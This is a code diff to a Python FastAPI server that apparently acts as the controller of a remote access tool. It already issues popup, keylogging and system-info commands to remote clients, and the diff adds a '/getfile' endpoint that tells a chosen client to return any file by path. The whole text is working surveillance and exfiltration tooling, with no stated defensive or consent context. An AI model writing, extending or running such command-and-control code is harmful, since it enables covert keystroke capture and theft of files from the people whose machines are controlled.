@@ -5,7 +5,8 @@ import uvicorn
 from fastapi import FastAPI
 
 import configurator
-from commands import PopupCommand, PopupParameters, BasicCommand, CommandType, KeyLogCommand, KeyLogParameters
+from commands import PopupCommand, PopupParameters, BasicCommand, CommandType, KeyLogCommand, KeyLogParameters, \
+    GetFileCommand, GetFileParameters
 from protocol.requests import RequestHeader, RequestType, SendCommandRequest, SendCommandContent
 from protocol.responses import BasicResponse, SendCommandResponse
 
@@ -98,6 +99,19 @@ def send_get_system_info_command(client_id: str) -> BasicResponse:
                 request_type=RequestType.SendCommand
             ),
             content=SendCommandContent(command=BasicCommand(command_type=CommandType.GetSystemInfo))
+        )
+    )
+
+
+@app.get("/getfile")
+def send_getfile_command(client_id: str, path: str) -> BasicResponse:
+    return make_command_request(
+        SendCommandRequest(
+            header=RequestHeader(
+                client_id=client_id,
+                request_type=RequestType.SendCommand
+            ),
+            content=SendCommandContent(command=GetFileCommand(parameters=GetFileParameters(path=path)))
         )
     )
 
